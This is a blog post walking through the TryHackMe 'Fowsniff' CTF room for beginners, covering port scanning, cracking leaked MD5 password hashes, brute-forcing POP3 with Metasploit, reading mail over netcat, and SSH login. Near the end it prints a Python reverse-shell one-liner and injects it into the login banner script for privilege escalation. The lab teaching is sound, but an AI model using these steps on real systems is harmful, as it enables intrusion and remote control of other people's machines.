@@ -1,0 +1,788 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="stortny">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Fowsniff CTF Walkthrough Detailed  Hello, and welcome to my first writeup!Even tho this room is very guided I’m gonna try to go (a bit) more in depth into it and hopefully make things more clear to my">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Fowsniff CTF Walkthrough">
+<meta property="og:url" content="http://example.commmm/2024/12/12/Fowsniff-CTF-Walkthrough-detailed/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Fowsniff CTF Walkthrough Detailed  Hello, and welcome to my first writeup!Even tho this room is very guided I’m gonna try to go (a bit) more in depth into it and hopefully make things more clear to my">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.commmm/img/fs/image.png">
+<meta property="og:image" content="http://example.commmm/img/fs/image2.png">
+<meta property="og:image" content="http://example.commmm/img/fs/image3.png">
+<meta property="og:image" content="http://example.commmm/img/fs/image4.png">
+<meta property="og:image" content="http://example.commmm/img/fs/image5.png">
+<meta property="og:image" content="http://example.commmm/img/fs/image6.png">
+<meta property="og:image" content="http://example.commmm/img/fs/image7.png">
+<meta property="og:image" content="http://example.commmm/img/fs/image8.png">
+<meta property="og:image" content="http://example.commmm/img/fs/image9.png">
+<meta property="og:image" content="http://example.commmm/img/fs/image10.png">
+<meta property="og:image" content="http://example.commmm/img/fs/image11.png">
+<meta property="og:image" content="http://example.commmm/img/fs/image12.png">
+<meta property="og:image" content="http://example.commmm/img/fs/image13.png">
+<meta property="og:image" content="http://example.commmm/img/fs/image14.png">
+<meta property="og:image" content="http://example.commmm/img/fs/image15.png">
+<meta property="og:image" content="http://example.commmm/img/fs/image17.png">
+<meta property="article:published_time" content="2024-12-12T11:25:09.000Z">
+<meta property="article:modified_time" content="2024-12-12T11:55:53.738Z">
+<meta property="article:author" content="stortny">
+<meta property="article:tag" content="thm">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.commmm/img/fs/image.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Fowsniff CTF Walkthrough - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.commmm","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>STORTNY&#39;S BLOG</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/rbg2.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Fowsniff CTF Walkthrough"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-12-12 12:25" pubdate>
+          December 12, 2024 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          255 words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          3 mins
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> views
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Fowsniff CTF Walkthrough</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>Fowsniff CTF Walkthrough Detailed</p>
+<hr>
+<h2 id="Hello-and-welcome-to-my-first-writeup-Even-tho-this-room-is-very-guided-I’m-gonna-try-to-go-a-bit-more-in-depth-into-it-and-hopefully-make-things-more-clear-to-my-fellow-beginners-let’s-get-started"><a href="#Hello-and-welcome-to-my-first-writeup-Even-tho-this-room-is-very-guided-I’m-gonna-try-to-go-a-bit-more-in-depth-into-it-and-hopefully-make-things-more-clear-to-my-fellow-beginners-let’s-get-started" class="headerlink" title="Hello, and welcome to my first writeup!Even tho this room is very guided I’m gonna try to go (a bit) more in depth into it and hopefully make things more clear to my fellow beginners, let’s get started."></a>Hello, and welcome to my first writeup!<br>Even tho this room is very guided I’m gonna try to go (a bit) more in depth into it and hopefully make things more clear to my fellow beginners, let’s get started.</h2><blockquote>
+<p><strong>Task 1 — deploy the machine</strong></p>
+</blockquote>
+<p>First we start with launching the attack box or openvpn if you’re using a VM</p>
+<p>what’s openvpn? OpenVPN is a software that creates a secure connection between your computer and another network. It allows you to securely connect your computer to TryHackMe’s servers so you can safely access their rooms and challenges over the internet. It’s like a private tunnel for your online adventures ✨ more details to be found <a target="_blank" rel="noopener" href="https://help.tryhackme.com/en/articles/6611809-getting-started-with-openvpn"><code>here</code></a>.<br><img src="/img/fs/image.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<ul>
+<li><em>no answer needed</em></li>
+</ul>
+<blockquote>
+<p><strong>Task 2 — What ports are open?</strong></p>
+</blockquote>
+<p>An Nmap scan is like a digital detective looking at a computer to find out what services it’s running. It checks all the doors and windows (all ports with -p-, uses default scripts -A to gather detailed info, and identifies software versions -sV. It’s like getting a full report on everything a computer is up to..</p>
+<p>let’s go ahead and run our scan by typing the following command</p>
+<blockquote>
+<p>nmap -A -p- -sV <machine ip addr></p>
+</blockquote>
+<p>Bare in mind that using -p- to scan all ports might take a while(forever), for a faster scan we can simply run “nmap -sC -sV <machine ip></p>
+<p>we’d get the following results<br><img src="/img/fs/image2.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>As we can see there are 4 open ports</p>
+<ul>
+<li><em>No answer needed</em></li>
+</ul>
+<blockquote>
+<p><strong>Task 3 — Look around. What can you find?</strong></p>
+</blockquote>
+<p>let’s breakdown the open ports that we found</p>
+<p>22&#x2F;tcp open ssh : SSH port means that the computer has a door (port) open and ready for Secure Shell (SSH) connections. SSH is a secure way to communicate with the computer remotely. It’s like having a secure key to the computer’s virtual door, allowing you to control it from a distance, often used for tasks like managing servers or accessing another computer’s command line.</p>
+<p>80&#x2F;tcp open http : it means that a specific port on a computer is allowing communication via the Hypertext Transfer Protocol (HTTP). HTTP is the protocol used for transmitting data on the web. An open HTTP port typically indicates that the computer is serving web content or hosting a website. It’s like the computer having a door open specifically for web browsers and other web-related applications to communicate with it.</p>
+<p>we can access this web page by typing the url : http:&#x2F;&#x2F;<machine ip> in our browser, it will take us to this page</p>
+<p><img src="/img/fs/image3.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>interesting huh.</p>
+<p>110&#x2F;tcp open pop3 : it means that a specific port on a computer is allowing communication via the Post Office Protocol version 3 (POP3). POP3 is a protocol used for retrieving emails from a mail server. An open POP3 port suggests that the computer is set up to receive email messages using this protocol. It’s like a designated entrance for email clients to connect and fetch emails from the server.</p>
+<p>143&#x2F;tcp open imap : it means that a specific port on a computer is allowing communication via the Internet Message Access Protocol (IMAP). IMAP is a protocol used for accessing and managing emails on a mail server. An open IMAP port indicates that the computer is configured to handle email communications using this protocol. It’s like having a designated gateway for email clients to connect, view, and manage messages stored on the mail server</p>
+<ul>
+<li><em>No answer needed</em></li>
+</ul>
+<blockquote>
+<p><strong>task 4 — can you find any public information about them?</strong></p>
+</blockquote>
+<p>“The attackers were also able to hijack our official @fowsniffcorp Twitter account”</p>
+<p>let’s take a look on the account !</p>
+<p>going through the tweets we’ll find some <a target="_blank" rel="noopener" href="https://pastebin.com/378rLnGi"><code>pastebin</code></a> links in which the attacker dumped the passwords<br><img src="/img/fs/image4.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>we see that all passwords are hashed using md5,</p>
+<p>md5 (The Message Digest 5) is an algorithm that turns it into a unique string of letters and numbers. Even a tiny change in the file makes the MD5 fingerprint totally different. It’s no longer secure in our modern days and became easy to crack.</p>
+<p>Also, let’s keep in mind that MD5 is a one-way hashing algorithm, meaning it’s designed to be irreversible. However, it’s crackable by Brute forcing attacks, hashing data and trying all possible combinations until the matching target is found.</p>
+<ul>
+<li><em>No answer needed</em></li>
+</ul>
+<blockquote>
+<p><strong>Task 5 — Can you decode these md5 hashes?</strong></p>
+</blockquote>
+<p>As this task suggested I will be using Hashkiller to crack those hashes</p>
+<p>I was able to crack all of them except stone’s ,</p>
+<p>mauer — 8a28a94a588a95b80163709ab4313aa4 — mailcall<br>mustikka — ae1644dac5b77c0cf51e0d26ad6d7e56 — bilbo101<br>tegel — 1dc352435fecca338acfd4be10984009 — apples01<br>baksteen — 19f5af754c31f1e2651edde9250d69bb — skyler22<br>seina — 90dc16d47114aa13671c697fd506cf26 — scoobydoo2<br>stone — a92b8a29ef1183192e3d35187e0cfabd — ??????<br>mursten — 0e9588cb62f4b6f27e33d449e2ba0b3b — carp4ever<br>parede — 4d6e42f56e127803285a0a7649b5ab11 — orlando12<br>sciana — f7fd98d380735e859f8b2ffbbede5a7e — 07011972</p>
+<ul>
+<li><em>No answer needed</em></li>
+</ul>
+<blockquote>
+<p><strong>Task 6 — Can you use metasploit to brute force the pop3 login?</strong></p>
+</blockquote>
+<p>Basically metasploit is a tool that ethical hackers use to find and fix security problems in computer systems. We’re gonna use it to bruteforce the pop3 login service.</p>
+<p>Before we dive into that let’s create a file with the username and another with passwords</p>
+<blockquote>
+<p>nano users.txt<br><img src="/img/fs/image5.png" srcset="/img/loading.gif" lazyload alt="image"><br>nano passwd.txt<br><img src="/img/fs/image6.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+</blockquote>
+<p>Now let’s fire up metasploit and search for pop3 vulns:</p>
+<p><img src="/img/fs/image7.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>login utility is exactly what we need,</p>
+<blockquote>
+<p>use 3</p>
+</blockquote>
+<p>we can all use “&gt; show options” to list all possible commands for this utility</p>
+<p>Now we need to specify the target remote host (the computer you want to test or exploit), we can do so by typing the command</p>
+<blockquote>
+<p>set rhosts <machine ip> : This tells Metasploit that it should attempt the exploit on the specified target.</p>
+</blockquote>
+<blockquote>
+<p>set user_file users.txt</p>
+</blockquote>
+<blockquote>
+<p>set pass_file passwd.txt</p>
+</blockquote>
+<blockquote>
+<p>set verbose flase : it instructs Metasploit to provide less detailed or verbose information during the execution of commands or modules. This can be useful when you want to reduce the amount of output to focus on essential information.</p>
+</blockquote>
+<p><img src="/img/fs/image8.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>Now we run it and wait for the magic to happen</p>
+<blockquote>
+<p>run<br><img src="/img/fs/image9.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+</blockquote>
+<p>We got it !!</p>
+<ul>
+<li><em>No answer needed</em></li>
+</ul>
+<blockquote>
+<p><strong>Task7 — What was seina’s password to the email service?</strong></p>
+</blockquote>
+<p>scoobydoo2</p>
+<blockquote>
+<p><strong>Task8 — Can you connect to the pop3 service with her credentials? What email information can you gather?</strong></p>
+</blockquote>
+<p>next let’s set our listener and login using the credentials we found</p>
+<blockquote>
+<p>nc <machine ip> 110</p>
+</blockquote>
+<blockquote>
+<p>User seina</p>
+</blockquote>
+<blockquote>
+<p>Pass scoobydoo2</p>
+</blockquote>
+<blockquote>
+<p>LIST</p>
+</blockquote>
+<p><img src="/img/fs/image10.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<ul>
+<li><em>No answer needed</em></li>
+</ul>
+<blockquote>
+<p><strong>Task9 — Looking through her emails, what was a temporary password set for her?</strong></p>
+</blockquote>
+<p>Let’s retrieve the 1st message by typing the command RETR 1<br><img src="/img/fs/image11.png" srcset="/img/loading.gif" lazyload alt="image"><br>let’s take a look at the second one RETR 2<br><img src="/img/fs/image12.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p><code>S1ck3nBluff+secureshell</code></p>
+<blockquote>
+<p><strong>Task10 — connect to the machine using SSH.</strong></p>
+</blockquote>
+<p>We got the credentials for the ssh , let’s login !<br><img src="/img/fs/image13.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>by typing the “id” command we can see that baskteen is not root and is just a regular user. No problem tho, let’s searches for files owned by the “users” group on the entire system and look for something useful</p>
+<blockquote>
+<p>find &#x2F; -group users -type f 2&gt;&#x2F;dev&#x2F;null<br><img src="/img/fs/image14.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+</blockquote>
+<p>the hint provided by TryHackMe points at that cube.sh file , hmmm… wonder what’s in it<br><img src="/img/fs/image15.png" srcset="/img/loading.gif" lazyload alt="image"><br>it’s the ssh banner, meaning this file is executed whenever we login through ssh. Perfect place to inject our reverse shell. I’ll be using the reverse shell provided by the room</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">python3 -c ‘import <span class="hljs-built_in">socket</span>,subprocess,os;s=<span class="hljs-built_in">socket</span>.<span class="hljs-built_in">socket</span>(<span class="hljs-built_in">socket</span>.AF_INET,<span class="hljs-built_in">socket</span>.SOCK_STREAM);s.connect((&lt;IP&gt;,<span class="hljs-number">1234</span>));os.dup2(s.fileno(),<span class="hljs-number">0</span>); os.dup2(s.fileno(),<span class="hljs-number">1</span>); os.dup2(s.fileno(),<span class="hljs-number">2</span>);p=subprocess.call([“/bin/sh”,”-i”]);’<br></code></pre></td></tr></table></figure>
+<p>We can edit the file using nano, dont forget to set up a listener and change your ip address in the reverseshell.<br><img src="/img/fs/image17.png" srcset="/img/loading.gif" lazyload alt="image"><br>And that’s itt!!</p>
+<p>No answer needed</p>
+<p>Thanks for reading ❤ feel free to leave any feedback so I can improve my articles, cya next time!</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/thm/" class="print-no-link">#thm</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Fowsniff CTF Walkthrough</div>
+      <div>http://example.commmm/2024/12/12/Fowsniff-CTF-Walkthrough-detailed/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>stortny</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>December 12, 2024</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/08/26/gawk/" title="HTB: Gawk writeup">
+                        <span class="hidden-mobile">HTB: Gawk writeup</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
